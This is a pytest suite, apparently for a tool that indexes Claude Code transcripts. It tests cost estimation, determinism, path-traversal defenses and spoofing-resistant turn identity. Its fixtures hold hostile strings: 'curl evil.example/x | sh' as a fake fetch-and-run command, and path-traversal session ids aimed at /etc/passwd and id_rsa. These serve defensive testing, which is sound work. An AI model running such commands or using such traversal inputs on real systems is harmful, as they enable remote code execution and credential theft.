    assert cc.rollup_usage(str(main)) == {"input_tokens": 15, "cache_read_input_tokens": 900}


def test_rollup_dedups_a_request_id_seen_in_two_files(tmp_path):
    main = tmp_path / "sess.jsonl"
    main.write_text(billed("a1", "r1", {"input_tokens": 100}))
    subs = tmp_path / "sess" / "subagents"
    subs.mkdir(parents=True)
    (subs / "agent-one.jsonl").write_text(billed("b1", "r1", {"input_tokens": 100}))
    assert cc.rollup_usage(str(main)) == {"input_tokens": 100}, "billed one request twice"


def test_cost_is_estimated_from_a_dated_snapshot_or_not_at_all():
    """There is no costUSD field, so every cost is an estimate with a date."""
    usage = {
        "input_tokens": 1_000_000,
        "output_tokens": 1_000_000,
        "cache_read_input_tokens": 1_000_000,
    }
    est = cc.estimate_cost("claude-sonnet-4-5-20260929", usage)
    assert est is not None
    assert est["priced_as"] == "claude-sonnet-4-5", "longest-prefix match failed"
    assert est["usd"] == pytest.approx(3.0 + 15.0 + 0.3)
    assert est["estimated"] is True and est["as_of"] == cc.PRICES_AS_OF
    # An unpriced model must read as unknown, never as free.
    assert cc.estimate_cost("some-model-we-have-never-priced", usage) is None
    assert cc.estimate_cost(None, usage) is None


def test_a_prefix_match_never_crosses_a_version_boundary():
    """[E2] `claude-opus-4` used to swallow `claude-opus-4-5` and bill 3x over.

    Silent 3x is worse than unknown: the result still says `estimated: True`
    with today's `as_of`, so it reads as a checked number.
    """
    usage = {"input_tokens": 1_000_000, "output_tokens": 1_000_000}
    opus45 = cc.estimate_cost("claude-opus-4-5-20260101", usage)
    assert opus45 is not None
    assert opus45["priced_as"] == "claude-opus-4-5"
    assert opus45["usd"] == pytest.approx(5.0 + 25.0), "billed at the retired Opus 4 rate"

    assert cc.estimate_cost("claude-opus-4-20250514", usage)["priced_as"] == "claude-opus-4"
    # A version we have not priced reads as unknown, not as its predecessor.
    assert cc.estimate_cost("claude-opus-4-9-20270101", usage) is None
    assert cc.estimate_cost("claude-opus-4-suffixed", usage) is None


# --- Determinism, actually tested across processes -------------------------

_DIGEST_SCRIPT = """
import hashlib, sys
sys.path.insert(0, %r)
from gitmemory.adapters import claude_code as cc
h = hashlib.sha256()
for p in sys.argv[1:]:
    h.update(cc.parse(p).to_canonical())
    h.update(b"\\x00")
print(h.hexdigest())
"""


def _corpus_digest(env_extra: dict) -> str:
    src = str(pathlib.Path(__file__).resolve().parent.parent / "src")
    env = dict(os.environ, **env_extra)
    out = subprocess.run(
        [sys.executable, "-c", _DIGEST_SCRIPT % src, *_corpus()],
        capture_output=True,
        text=True,
        env=env,
        check=True,
    )
    return out.stdout.strip()


@pytest.mark.skipif(not _corpus(), reason="third-party corpus not fetched")
def test_canonical_output_is_identical_in_a_fresh_interpreter():
    """The determinism gate, run the only way it means anything.

    `parse(p).to_canonical() == parse(p).to_canonical()` inside one process
    proves almost nothing: it shares the same interned strings, the same dict
    ordering and the same PYTHONHASHSEED. The committed tree is rebuilt by a
    *new* process, so that is where the comparison has to happen — and under
    two different hash seeds, because set iteration order is the classic way a
    build stops being reproducible.
    """
    a = _corpus_digest({"PYTHONHASHSEED": "0"})
    b = _corpus_digest({"PYTHONHASHSEED": "12345"})
    assert a == b, "canonical output depends on PYTHONHASHSEED — the tree would churn"

    h = hashlib.sha256()
    for p in _corpus():
        h.update(cc.parse(p).to_canonical())
        h.update(b"\x00")
    assert h.hexdigest() == a, "a fresh interpreter produced a different tree"


# --- find_session takes an untrusted id from a hook payload ----------------


@pytest.mark.parametrize(
    "hostile",
    [
        "../../../../etc/passwd",
        "..",
        "../secrets",
        "*",
        "?",
        "[a-z]*",
        "**/id_rsa",
        "a/../../b",
        "",
        ".hidden",
        "x" * 200,
    ],
)
def test_find_session_refuses_a_hostile_id(tmp_path, hostile):
    """The id arrives in a hook payload and was interpolated straight into a glob.

    `..` walked out of the projects root and glob metacharacters widened the
    search to whatever matched — both reachable by anything that can write a
    hook payload.

    Every hostile id gets a file it *would* resolve to. Without them the fixture
    had only `real.jsonl`, so `found is None` held for the wrong reason: there
    was nothing on disk for `.hidden` or a 200-character id to find, and
    deleting the charset guard outright left all eleven cases green. A guard
    whose removal changes no answer is pinned by nothing. [E4, vacuity pass 2: L3]
    """
    projects = tmp_path / "projects"
    root = projects / "-Users-x-work"
    root.mkdir(parents=True)
    (root / "real.jsonl").write_text("{}\n")
    # A dotfile the glob will happily match once the leading-alphanumeric rule
    # is gone, and an over-length name the {0,127} bound is the only thing
    # refusing. Both are inside the root, so the containment check passes them.
    (root / ".hidden.jsonl").write_text("{}\n")
    (root / ("x" * 200 + ".jsonl")).write_text("{}\n")
    # `projects/*/../secrets.jsonl` realpaths back inside the root, so traversal
    # is not caught by the containment check either — only by the charset.
    (projects / "secrets.jsonl").write_text("{}\n")
    (tmp_path / "secrets.jsonl").write_text("{}\n")

    found = cc.find_session(hostile, str(projects))
    assert found is None, f"escaped or widened the search: {found}"


_TIE_SCRIPT = """
import sys
sys.path.insert(0, %r)
from gitmemory.adapters import claude_code as cc
print(cc.find_session("abc-123", sys.argv[1]) or "")
"""


def test_find_session_breaks_mtime_ties_deterministically(tmp_path):
    """`max(set(...))` over equal mtimes returned whichever the set yielded first.

    Run in fresh interpreters, because within one process set iteration order is
    a constant and looping twenty times proves nothing. The first version of
    this test did exactly that, and deleting the path tie-break from `newest()`
    — the precise defect the docstring names — left the suite green. Across six
    `PYTHONHASHSEED` values the mutant answers `-c -a -a -c -b -c`; the shipped
    code answers `-c` every time.

    The expected winner is spelled out rather than only checked for agreement:
    six runs that agree on the wrong project are still six runs that agree.
    With equal mtimes `max` falls through to the path, so the lexicographically
    largest one wins. [E4, vacuity pass 2: L4]
    """
    root = tmp_path / "projects"
    for proj in ("-a", "-b", "-c"):
        d = root / proj
        d.mkdir(parents=True)
        f = d / "abc-123.jsonl"
        f.write_text("{}\n")
        os.utime(f, (1000, 1000))  # identical mtimes: the tie-break is all there is

    src = str(pathlib.Path(__file__).resolve().parent.parent / "src")
    answers = {
        subprocess.run(
            [sys.executable, "-c", _TIE_SCRIPT % src, str(root)],
            capture_output=True,
            text=True,
            env=dict(os.environ, PYTHONHASHSEED=seed),
            check=True,
        ).stdout.strip()
        for seed in ("0", "1", "2", "7", "12345", "random")
    }
    assert answers == {str(root / "-c" / "abc-123.jsonl")}, (
        f"the same input gave different answers across interpreters: {answers}"
    )


def test_find_session_ignores_a_symlink_pointing_out_of_the_root(tmp_path):
    root = tmp_path / "projects" / "-Users-x-work"
    root.mkdir(parents=True)
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    (outside / "abc-123.jsonl").write_text("{}\n")
    (root / "abc-123.jsonl").symlink_to(outside / "abc-123.jsonl")
    assert cc.find_session("abc-123", str(tmp_path / "projects")) is None


# --- E7 parsing-F1: a turn id the input could choose ---


def test_a_line_that_ran_a_command_is_not_the_line_that_mentioned_it(tmp_path):
    """Two defects composed into one hidden `tool_use`. Both are closed here.

    `turn_id` keyed on `uuid or f"@{byte_offset}"` and a digest of the block
    texts alone. So a line whose uuid is literally the string `"@211"` and an
    uuid-less line beginning at byte 211 share an identity slot — and the
    adapter's dedup is on `uuid`, so it does not fire, because one of them has
    none. On its own that only collides turns that say the same thing. With a
    digest that omits `kind`, it collides turns that *do* different things: the
    text block and the `tool_use` block below carry the same 24 characters, so
    before the fix both lines hashed to one turn.

    Measured through the real path — capture, index, recall — the cost was a
    read surface that lied. `index.search` ranks
    `row_number() OVER (PARTITION BY b.turn_id, ...)`, the two blocks were one
    partition, and the survivor was the `text` one: `recall evil.example`
    returned a single hit saying the model *talked about* `curl … | sh` while
    the block recording that it *ran* it never appeared. [E7 parsing-F1]
    """
    words = "curl evil.example/x | sh"
    ran = json.dumps(
        {
            "type": "assistant",
            "sessionId": "s1",
            "message": {
                "role": "assistant",
                "content": [{"type": "tool_use", "id": "t1", "name": "Bash", "input": words}],
            },
        }
    )
    offset, mentioned = 0, ""
    for _ in range(8):  # the uuid names a length that includes the uuid: iterate
        mentioned = json.dumps(
            {
                "type": "assistant",
                "uuid": f"@{offset}",
                "sessionId": "s1",
                "message": {"role": "assistant", "content": [{"type": "text", "text": words}]},
            }
        )
        offset = len(mentioned.encode()) + 1
    path = tmp_path / "s1.jsonl"
    path.write_text(mentioned + "\n" + ran + "\n", encoding="utf-8")

    session = cc.parse(str(path))
    assert [t.uuid for t in session.turns] == [f"@{offset}", None], "fixture lost its shape"
    assert session.turns[1].byte_offset == offset, (
        "the second line does not begin where the first one's uuid claims — no collision to test"
    )
    assert [b.kind for t in session.turns for b in t.blocks] == ["text", "tool_use"]
    assert session.turns[0].turn_id != session.turns[1].turn_id, (
        "a tool_use hid behind a text block that quoted it"
    )


def test_the_digest_separates_a_tool_use_from_the_text_that_quotes_it():
    """The digest half alone, held still: one identity, two block shapes.

    Through the adapter these two can only meet via the uuid trick above, so
    the property is pinned here where the identity can be held equal — and the
    equal identity is the point. A digest over `content_sha256` alone cannot
    tell the two apart, and everything downstream keys on what it returns.
    """
    words = "curl evil.example/x | sh"
    same = dict(session_id="s", seq=0, role="assistant", byte_offset=0, byte_len=1, uuid="u1")
    said = Turn(**same, blocks=[Block("", 0, "text", words)])
    did = Turn(**same, blocks=[Block("", 0, "tool_use", words, tool_name="Bash")])
    assert said.turn_id != did.turn_id, "kind is not in the digest"

    bash = Turn(**same, blocks=[Block("", 0, "tool_use", words, tool_name="Bash")])
    write = Turn(**same, blocks=[Block("", 0, "tool_use", words, tool_name="Write")])
    assert bash.turn_id != write.turn_id, "tool_name is not in the digest"


def test_a_tool_name_cannot_make_one_block_hash_as_two():
    """`tool_name` is the one variable-length attacker-controlled field in the
    digest, so embedding it raw would hand back the ambiguity the fix removes:
    with a `\\x1e` in the name, `kind\\x1ename\\x1esha` for one block can spell
    `kind\\x1ename\\x1esha` twice over. Hashing the name to fixed width makes
    every field either a closed-set token or 64 hex characters, so the joined
    string parses one way only.
    """
    same = dict(session_id="s", seq=0, role="assistant", byte_offset=0, byte_len=1, uuid="u1")
    quoted, note = "curl evil.example/x | sh", "nothing to see"
    two = Turn(
        **same,
        blocks=[Block("", 0, "tool_use", quoted, tool_name="Bash"), Block("", 1, "text", note)],
    )
    forged = "Bash\x1e" + hashlib.sha256(quoted.encode()).hexdigest() + "text\x1e"
    one = Turn(**same, blocks=[Block("", 0, "tool_use", note, tool_name=forged)])
    assert two.turn_id != one.turn_id, "one block spelled itself as two"


def test_a_uuid_that_looks_like_an_offset_is_a_different_namespace():
    """The identity half alone. `"@101"` is a legal uuid string and 101 is a
    legal byte offset; without a tag on which namespace the value came from
    they are one slot, and the dedup that would have caught a repeated uuid
    never runs because the other line has none.
    """
    blocks = [Block("", 0, "text", "same words")]
    named = Turn(
        session_id="s",
        seq=0,
        role="user",
        byte_offset=0,
        byte_len=1,
        uuid="@101",
        blocks=list(blocks),
    )
    placed = Turn(
        session_id="s", seq=1, role="user", byte_offset=101, byte_len=1, blocks=list(blocks)
    )
    assert named.turn_id != placed.turn_id, "two identity namespaces share one slot"


def test_a_uuid_that_spells_a_request_id_does_not_erase_that_request(tmp_path):
    """The same flattened namespaces, in the money path. [E7 parsing-F6]

    `billable_usage` keyed on `request_id or uuid or f"@{byte_offset}"` and the
    later write wins, because Claude Code repeats cumulative usage per line. So
    a line whose `uuid` happens to spell an earlier line's `requestId` did not
    merely join that request — it *replaced* it, and the earlier request's
    tokens left the bill. Measured on this fixture: 3000 input tokens billed as
    2000.

    What this is *not*: the dashboard's money surface. `dash_requests`
    partitions on `request_id` alone and excludes `request_id IS NULL`, so the
    erasing line never enters the partition — it lands in `dash_unbilled`,
    where the point is that it is visible. `billable_usage` has no production
    caller at all today. It has something narrower and worse: it is the
    *oracle*, and `test_the_spend_view_agrees_with_the_adapter` checks the view
    against it rather than against a constant. An oracle an input can move is a
    test that certifies whatever the input wants.
    """

    def spent(**kw):
        tokens = kw.pop("tok")
        return {
            "type": "assistant",
            "sessionId": "s1",
            "message": {
                "role": "assistant",
                "model": "m",
                "content": [{"type": "text", "text": "x"}],
                "usage": {"input_tokens": tokens},
            },
            **kw,
        }

    honest = [
        spent(tok=1000, requestId="req_a", uuid="u1"),
        spent(tok=2000, requestId="req_b", uuid="u2"),
    ]
    assert billable_usage(cc.parse(write(tmp_path, "a.jsonl", honest))) == {"input_tokens": 3000}, (
        "the fixture does not bill two requests; it proves nothing"
    )

    hostile = [spent(tok=1000, requestId="req_a", uuid="u1"), spent(tok=2000, uuid="req_a")]
    assert billable_usage(cc.parse(write(tmp_path, "b.jsonl", hostile))) == {
        "input_tokens": 3000
    }, "a uuid took a request id's slot and the request's tokens left the bill"


# --- E7 parsing-F3: a line that chose its own role ------------------------


def test_the_line_type_decides_the_role_not_the_message(tmp_path):
    """`message.role` was preferred over `type`, and it is a field in the file.

    So a `type: "user"` line could declare `message.role: "assistant"` and
    become a model call everywhere role is the test: `index.py`'s
    `role = 'assistant'` filter, `billable_usage`, and `rollup_usage` all read
    the value the line supplied.

    Both directions are asserted. An assistant line claiming to be a user would
    otherwise be a way to *leave* the bill, which is the same defect with the
    sign flipped. [E7 parsing-F3]
    """
    lines = [
        {
            "type": "user",
            "uuid": "u1",
            "sessionId": "s1",
            "message": {"role": "assistant", "content": [{"type": "text", "text": "x"}]},
        },
        {
            "type": "assistant",
            "uuid": "u2",
            "sessionId": "s1",
            "message": {"role": "user", "content": [{"type": "text", "text": "y"}]},
        },
    ]
    roles = [t.role for t in cc.parse(write(tmp_path, "a.jsonl", lines)).turns]
    assert roles == ["user", "assistant"], "message.role overrode the line type"


def test_role_is_one_of_three_literals_this_module_writes(tmp_path):
    """The charset and length half, and the reason it needs no separate guard.

    `role` used to be whatever string the file put in `message.role` — 200,000
    characters, or a NUL — and it flowed into `turn_id` and into the SQLite
    `turns` row unchecked. Taking it from the line type instead makes it a
    closed set by construction, so there is nothing left to bound. This test is
    what notices if a later change reopens that: it asserts the set, not a
    length limit, because a length limit would be the wrong fix.
    """
    hostile = [
        {"type": t, "uuid": f"u{i}", "sessionId": "s1", "message": {"role": r, "content": "x"}}
        for i, (t, r) in enumerate(
            [
                ("user", "a" * 200_000),
                ("assistant", "root\x00admin"),
                ("progress", "assistant"),
                ("future_synthetic_record", "assistant"),
                (None, "assistant"),
            ]
        )
    ]
    session = cc.parse(write(tmp_path, "b.jsonl", hostile))
    assert len(session.turns) == len(hostile), "the fixture lost a line; it proves less"
    assert {t.role for t in session.turns} == {"user", "assistant", "system"}


def test_the_adapter_bill_is_not_spoofable_either(tmp_path):
    """The view is not the only implementation of the rule.

    `billable_usage` and `rollup_usage` skip `t.role != "assistant"`, so they
    read the same spoofable value the SQL did — and `billable_usage` is the
    oracle `test_the_spend_view_agrees_with_the_adapter` checks the view
    against. Had only the SQL been fixed, the two would have disagreed and the
    oracle would have been the one believed. [E7 parsing-F3]
    """

    def line(kind, role, tokens, **kw):
        return {
            "type": kind,
            "sessionId": "s1",
            "message": {
                "role": role,
                "model": "m",
                "content": [{"type": "text", "text": "x"}],
                "usage": {"input_tokens": tokens},
            },
            **kw,
        }

    lines = [
        line("assistant", "assistant", 100, uuid="u1", requestId="req_a"),
        line("user", "assistant", 9_000_000, uuid="u2", requestId="req_b"),
    ]
    assert billable_usage(cc.parse(write(tmp_path, "c.jsonl", lines))) == {"input_tokens": 100}


# --- E7 parsing-F5: a session id re-hashed once per turn ------------------


def test_a_long_session_id_is_bounded_before_it_reaches_every_turn(tmp_path):
    """`session_id` is inside every `turn_id`, so its length is per-turn work.

    Measured on two 20,001-turn fixtures differing in nothing but the id: 16
    characters parsed in 0.13 s CPU, 1,000,000 characters in 6.75 s — quadratic
    work for linear input, on `index.build`'s path, once per rebuild. After the
    bound both are 0.14 s.

    The assertion is the bound, not the clock. A timing test on a shared
    machine is a coin flip, and the bound is the thing that has to hold: if it
    is gone the cost is back, whatever the clock said that afternoon.

    Both places the id enters a turn are covered, because they are two: the
    session-level one every uuid-less line inherits, and the per-line
    `sessionId`, which a hostile file can vary line by line. [E7 parsing-F5]
    """
    huge = "s" * 1_000_000
    inherited = [
        {"type": "user", "uuid": "u0", "sessionId": huge, "message": {"content": "start"}},
        {"type": "user", "uuid": "u1", "message": {"content": "x"}},
    ]
    session = cc.parse(write(tmp_path, "a.jsonl", inherited))
    assert len(session.session_id) <= cc._MAX_ID
    assert {len(t.session_id) for t in session.turns} == {len(session.session_id)}

    per_line = [
        {"type": "user", "uuid": f"u{i}", "sessionId": huge + str(i), "message": {"content": "x"}}
        for i in range(3)
    ]
    session = cc.parse(write(tmp_path, "b.jsonl", per_line))
    assert len(session.turns) == 3, "the fixture lost a line; it proves less"
    assert max(len(t.session_id) for t in session.turns) <= cc._MAX_ID


def test_two_long_session_ids_stay_two_sessions(tmp_path):
    """Truncation, not rejection, and not a bare prefix either.

    Rejecting a too-long id falls back to the filename stem, and two
    transcripts in different directories share a stem — that swaps a cost bug
    for turns from unrelated sessions minting the same `turn_id`. A bare prefix
    does the same thing to two ids with a common head, which is the shape a
    generated id has. The digest suffix is what keeps the map injective.
    """
    head = "s" * 1_000_000
    ids = [
        cc.parse(
            write(
                tmp_path,
                f"{i}.jsonl",
                [{"type": "user", "uuid": "u0", "sessionId": head + tail, "message": {}}],
            )
        ).session_id
        for i, tail in enumerate(("-alpha", "-beta"))
    ]
    assert len(set(ids)) == 2, "two sessions collapsed into one id"


def test_a_short_session_id_is_passed_through_untouched(tmp_path):
    """The bound must not rewrite the ids real transcripts carry.

    A uuid is 36 characters. If the helper normalised unconditionally, every
    `turn_id` in the store would change and the whole derived tree would churn
    — the failure this project exists to avoid — for input that was never the
    problem.
    """
    uid = "3f2b9c14-7a55-4e0d-9d3e-1c6b8a204f77"
    lines = [{"type": "user", "uuid": "u0", "sessionId": uid, "message": {"content": "x"}}]
    assert cc.parse(write(tmp_path, "c.jsonl", lines)).session_id == uid


def test_a_refused_line_is_named_not_folded_into_a_decode_error(tmp_path, monkeypatch):
    """`skipped` is the contract that says nothing was swallowed silently.

    A line refused for its size is not a line `json` refused, and one counter
    for both loses the only signal that content was dropped for a reason the
    reader chose rather than one the file forced. The accounting identity has
    to keep holding either way — it is what makes the counter worth reading.
    [E7 parsing-F4]
    """
    path = tmp_path / "s.jsonl"
    with open(path, "wb") as fh:
        fh.write(json.dumps(user("u1", "hello")).encode() + b"\n")
        fh.write(b'{"type":"user","uuid":"u2","message":{"content":"' + b"A" * 9000 + b'"}}\n')
        fh.write(b"{not json}\n")
        fh.write(json.dumps(user("u3", "bye")).encode() + b"\n")

    # The cap is lowered rather than the fixture grown: a genuine 32 MiB line
    # would put half a second into every run of the suite to test a number.
    original = cc.iter_records
    monkeypatch.setattr(
        cc, "iter_records", lambda p, on_error=None: original(p, on_error, max_line=4096)
    )
    s = check_adapter(cc, str(path))

    assert [t.uuid for t in s.turns] == ["u1", "u3"]
    assert s.skipped == {"line_too_long": 1, "json_decode_error": 1}
    assert len(s.turns) + sum(s.skipped.values()) == s.records_seen


# --- E7 parsing-F2: a line that stopped parsing, and took the rest with it ---


def test_a_fused_line_that_stops_parsing_says_how_much_it_dropped(tmp_path):
    """One skip is one skip whether it cost sixty bytes or six hundred.

    A parse failure part-way along a line abandons the rest of that line.
    There is no resynchronisation point in concatenated JSON that isn't a
    guess, so stopping is right. What was wrong is that it was indistinguish-
    able from a line that simply failed: same `json_decode_error`, count of
    one, identity balanced.

    Measured through the CLI before the fix, on a transcript whose single line
    held five well-formed objects and one truncated fragment: `records_seen=2`,
    one turn stored, one skip named. 685 of 844 bytes — 81% of the file —
    left no trace anywhere, and every conformance rule passed. That is a real
    shape: a crashed write loses its newline and the next append fuses onto
    it. [E7 parsing-F2]
    """
    good = [json.dumps(user(f"u{i}", f"turn {i}")) for i in range(1, 6)]
    fragment = '{"type":"user","uuid":"uX","message":{"content":"boom'
    fused = (good[0] + fragment + "".join(good[1:])).encode() + b"\n"
    s = check_adapter(cc, write(tmp_path, "s.jsonl", fused))

    assert [t.uuid for t in s.turns] == ["u1"]
    assert s.skipped == {"json_decode_truncated": 1}
    assert len(s.turns) + sum(s.skipped.values()) == s.records_seen


def test_a_line_that_fails_at_its_first_byte_is_still_an_ordinary_bad_line(tmp_path):
    """The new name has to mean something, so it cannot be every bad line.

    A line that never yielded anything dropped nothing beyond itself, and
    calling that `json_decode_truncated` would make the counter say "content
    was lost past a parse failure" on every malformed transcript — which is
    the same as saying nothing. Raised only when the line already yielded, so
    the name tracks the thing it claims. [E7 parsing-F2]
    """
    body = json.dumps(user("u1", "hello")).encode()
    s = check_adapter(cc, write(tmp_path, "s.jsonl", b"{not json}\n" + body + b"\n"))

    assert [t.uuid for t in s.turns] == ["u1"]
    assert s.skipped == {"json_decode_error": 1}


# --- E7 parsing-F7 + F11: numbers and names a line chose the size of ---


def test_a_token_count_too_big_for_a_float_does_not_crash_the_cost_column(tmp_path):
    """JSON integers are arbitrary precision. So are Python's. Floats are not.

    `"input_tokens": <10**400>` is a valid JSON integer and a valid Python
    one, and multiplying it by a price raised `OverflowError: int too large to
    convert to float` — the dashboard's cost column crashing on a number a
    transcript chose. Negative counts are the same input mirrored: a line
    billing itself a refund.

    Clamped rather than zeroed, so the estimate stays monotonic in the input.
    An absurd count reading as $0.00 would say "free", which is the one thing
    this column must never say by accident. [E7 parsing-F7]
    """
    huge = cc.estimate_cost("claude-sonnet-4-5", {"input_tokens": 10**400})
    assert huge is not None and huge["usd"] > 0

    refund = cc.estimate_cost("claude-sonnet-4-5", {"input_tokens": -(10**9)})
    assert refund is not None and refund["usd"] == 0.0

    ordinary = cc.estimate_cost("claude-sonnet-4-5", {"input_tokens": 1_000_000})
    assert 0 < ordinary["usd"] < huge["usd"], "the clamp must not invert the order"


def test_the_other_identifiers_are_bounded_too_including_the_usage_keys(tmp_path):
    """`sessionId` was bounded by F5 and the rest of its family was not.

    `model`, `requestId`, `timestamp` and the keys of `usage` each get written
    once per turn into canonical JSON and once per turn into the index, so each
    is the same cost and the same git bloat one layer along. Measured before
    this: one line carrying 200,000-character values for all three, plus a
    100,000-character usage key, put every one of them into the record
    verbatim.

    Longest real values over the 162-fixture corpus: model 26, requestId 28,
    timestamp 27, usage key 27. The bound is 128. [E7 parsing-F11]
    """
    lines = [
        {
            "type": "assistant",
            "uuid": "a1",
            "sessionId": "s1",
            "requestId": "R" * 200_000,
            "timestamp": "T" * 200_000,
            "message": {
                "model": "M" * 200_000,
                "content": [{"type": "text", "text": "hi"}],
                "usage": {"K" * 100_000: 1, "input_tokens": 5},
            },
        }
    ]
    t = check_adapter(cc, write(tmp_path, "s.jsonl", lines)).turns[0]

    assert len(t.model) == cc._MAX_ID
    assert len(t.request_id) == cc._MAX_ID
    assert len(t.ts) == cc._MAX_ID
    assert sorted(len(k) for k in t.usage) == [12, cc._MAX_ID]
    assert t.usage["input_tokens"] == 5, "bounding the keys must not lose the real one"


def test_two_long_model_names_stay_two_models(tmp_path):
    """A `model` collapsed to a constant merges two models' spend into one row.

    This is why the bound truncates with a digest rather than eliding to a
    marker the way `_scrub` treats an over-long *value*: a spend table keyed on
    a name that two different models share is a bill nobody can read.
    [E7 parsing-F11]
    """
    assert cc._bounded_id("A" * 5000) != cc._bounded_id("A" * 4999 + "B")
    assert cc._bounded_id("claude-sonnet-4-5") == "claude-sonnet-4-5"


# --- E7 parsing-F8/F9/F10/F12/F13/F14/F15: the tail of the parsing round ---


def test_a_float_from_a_transcript_does_reach_canonical_output(tmp_path):
    """The claim `test_canonical_output_has_no_floats` used to make, refuted.

    That test asserted no float appears in canonical output over the MIT
    corpus and its docstring explained this as holding "by construction". It
    does not: `_scrub` passes finite floats through, `canonical_json` permits
    them deliberately, and one line is enough to show it.

    Pinned rather than prevented. Rejecting floats would mean either dropping
    a value a transcript supplied or rewriting it, and `native` is supposed to
    be what the file said. The cross-language caveat in `canonical_json`'s
    docstring is the real contract; the corpus test is a watch, not a wall.
    [E7 parsing-F8]
    """
    lines = [
        {
            "type": "user",
            "uuid": "u1",
            "sessionId": "s1",
            "message": {"content": "x", "usage": {"ratio": 0.25}},
        }
    ]
    doc = json.loads(check_adapter(cc, write(tmp_path, "s.jsonl", lines)).to_canonical())
    assert doc["turns"][0]["usage"]["ratio"] == 0.25
    assert isinstance(doc["turns"][0]["usage"]["ratio"], float)


def test_an_invalid_byte_and_its_escape_are_one_record_and_two_files(tmp_path):
    """Reported as a `turn_id` collision; it is content addressing working.

    A raw `\\xff` decodes through `surrogateescape` to U+DCFF, and the six
    characters `\\udcff` in a JSON string unescape to the same U+DCFF. The two
    files parse to the same value, so they get the same `turn_id` — exactly as
    `{"a":"x"}` and `{"a":"\\u0078"}` do. An id over parsed content that
    distinguished two spellings of one value would be the bug.

    The byte-level distinction is the store's job and the store keeps it:
    captured through the CLI the two files produce different `file_sha256`,
    different segment digests and different session keys. Both halves are
    asserted here so the reasoning cannot rot into an untested claim.
    [E7 parsing-F9, not a defect]
    """
    head = b'{"type":"user","uuid":"u1","sessionId":"s1","message":{"content":"x'
    raw_byte = write(tmp_path, "a.jsonl", head + b'\xff"}}\n')
    escaped = write(tmp_path, "b.jsonl", head + b'\\udcff"}}\n')

    a, b = cc.parse(raw_byte), cc.parse(escaped)
    assert a.turns[0].turn_id == b.turns[0].turn_id
    assert pathlib.Path(raw_byte).read_bytes() != pathlib.Path(escaped).read_bytes()
    assert hashlib.sha256(pathlib.Path(raw_byte).read_bytes()).hexdigest() != hashlib.sha256(
        pathlib.Path(escaped).read_bytes()
    ).hexdigest(), "the byte layer must still tell them apart"


def test_a_symlink_loop_bills_a_subagent_file_once(tmp_path):
    """`rollup_usage` parses every path `session_files` returns.

    `**` walks into symlinked directories, so a `subagents/` directory holding
    a link back to its own parent turns one file into one path per level until
    the kernel's symlink limit stops it. Measured before the dedup: a single
    `agent-1.jsonl` came back 17 times, which is the same tokens billed 17
    times. Bounded by the kernel rather than by us — which is what made a line
    of code worth it. [E7 parsing-F13]
    """
    main = tmp_path / "x.jsonl"
    main.write_text(json.dumps(user("u1", "main")) + "\n")
    subs = tmp_path / "x" / "subagents"
    subs.mkdir(parents=True)
    (subs / "agent-1.jsonl").write_text(json.dumps(user("a1", "sub")) + "\n")
    os.symlink(tmp_path / "x", subs / "loop")

    files = cc.session_files(str(main))
    assert len(files) == 2, f"one main + one subagent, got {len(files)}"
    assert [os.path.basename(f) for f in files] == ["x.jsonl", "agent-1.jsonl"]


def test_a_sidechain_flag_is_a_boolean_not_a_truthy_string(tmp_path):
    """"false" is a true string. This flag decides whose tokens these are.

    `bool(obj.get("isSidechain"))` made every non-empty string a sidechain,
    including the string "false". Over the 162-fixture corpus the value is a
    real boolean on all 4,392 lines that carry it — 3,774 False, 618 True — so
    `is True` costs nothing real and removes the reading a line could choose.
    [E7 parsing-F14]
    """
    lines = [
        dict(user(f"u{i}", "x"), isSidechain=v)
        for i, v in enumerate(["false", "true", 1, 0, [], True, False])
    ]
    turns = check_adapter(cc, write(tmp_path, "s.jsonl", lines)).turns
    assert [t.is_sidechain for t in turns] == [False, False, False, False, False, True, False]


def test_a_byte_order_mark_does_not_cost_the_first_line(tmp_path):
    """Three bytes of file encoding used to be counted as a broken line.

    `raw_decode` refuses a BOM, so a BOM-prefixed transcript lost its whole
    first line to `json_decode_error`. Claude Code does not write one; an
    adapter for an agent on Windows will meet one, and this reader is shared.

    The span start moves past the BOM rather than the line being re-sliced
    into a new buffer, so the object's offset is still where the object is —
    `read_span` has to keep landing on parseable JSON. [E7 parsing-F15]
    """
    body = json.dumps(user("u1", "hello")).encode()
    path = write(tmp_path, "s.jsonl", b"\xef\xbb\xbf" + body + b"\n")
    s = check_adapter(cc, path)

    assert [t.uuid for t in s.turns] == ["u1"]
    assert s.skipped == {}
    assert s.turns[0].byte_offset == 3
    from gitmemory.jsonl import read_span

    assert json.loads(read_span(path, s.turns[0].byte_offset, s.turns[0].byte_len))


def test_an_elision_marker_is_forgeable_and_native_is_the_answer(tmp_path):
    """A line can say `[N chars elided]` and be indistinguishable from one.

    There is no in-band marker an in-band forger cannot write, so this is not
    fixed, it is bounded: the projection is a projection, and `native` carries
    what the file actually said. Asserted here so "check `native`" stays a
    property of the code rather than a sentence in a review.
    [E7 parsing-F12, accepted]
    """
    forged = "[100000 chars elided]"
    assert cc._scrub("A" * 100_000) == cc._scrub(forged)

    lines = [dict(user("u1", forged))]
    t = check_adapter(cc, write(tmp_path, "s.jsonl", lines)).turns[0]
    assert t.native["message"]["content"] == forged, "native must hold the literal text"


def test_the_adapter_has_no_default_place_to_look_for_transcripts():
    """`find_session(session_id)` used to mean "search the real `~/.claude`".

    No caller in the tree ever used that default, so it changed nothing today —
    which is the whole reason it survived. The watcher's stated rule is that
    watch roots have no default and a misconfigured run is loud rather than
    guessing; a helper on the same data with a silent default is that rule with
    one exception nobody chose, waiting for a second caller. Pinned in the
    signature because the behaviour it removes is unobservable from outside:
    with the default restored, a test that omits the root reads whatever home
    it is pointed at and passes. [E7 S11]
    """
    import inspect

    p = inspect.signature(cc.find_session).parameters["projects_root"]
    assert p.default is inspect.Parameter.empty, f"a default is back: {p.default!r}"
